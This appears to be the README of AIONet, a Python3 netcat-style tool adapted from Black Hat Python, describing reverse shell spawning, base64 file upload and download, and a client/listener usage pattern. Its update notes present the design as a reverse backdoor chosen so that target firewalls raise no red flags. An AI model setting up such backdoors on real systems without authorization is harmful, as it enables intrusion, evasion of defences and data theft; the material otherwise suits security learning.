# All-In-One Network Utility
AIONet was built as a multipurpose tool to replace netcat. Written in Python3, AIONet offers features like reverse shell spawning, file upload and file download.  The idea for this tool was obtained from chapter 2 of Black Hat Python by Justin Seitz. This program aims to update BHP's tool to provide features like class-based structure, Python3 support and error checking. A detailed explanation of the differences between the two can be found at the end of this document.

## Dependencies
* Python 3

## Download
### Option 1: Using git clone
```
git clone https://github.com/aarole/aionet.git
cd aionet/
```

### Option 2: Using wget
```
wget -O aionet.py https://raw.githubusercontent.com/aarole/aionet/master/aionet.py
```

## Usage
```
On host:           python3 aionet.py -p PORT -l
On remote machine: python3 aionet.py -t TARGET -p PORT

Options:
-t target, --target target IP address of the remote listener
-p port, --port port       If used with -l, port where listener is to be created; else, port where remote listener exists
-l, --listen               Create a listener on the port defined using -p
-h, --help                 show this help message and exit
```

## Updates
* Program structure overhauled to allow for easy extension
  * Created individual classes for the server (listener/host) and the client (target/remote machine)
* Updated program to use reverse backdoors
  * Listener is created on the physical machine and remote target connects to it
  * Opening a port on the host ensures that firewalls on the remote target do not raise red flags
* Replaced getopt with argparse
* Moved file manipulation (download and upload) to post-shell operations
  * Used the base64 library for encoding files during upload/download
* Used the os library to allow for usage of cd and rm commands
* Added error-checking during file upload/download with hashing

## TODO
* Add support for more fs-manipulating commands (eg: touch)

## Known issues
* File download
  * ~~Non-text files (png, jpg, pdf) cause errors when downloading them~~
  * ~~Files are partially downloaded and a part of the base64 encoded file is printed~~
  * Fix: Switched from length-based recv to sentinel-based recv
* Exit condition on the listener
  * Program does not exit properly on the server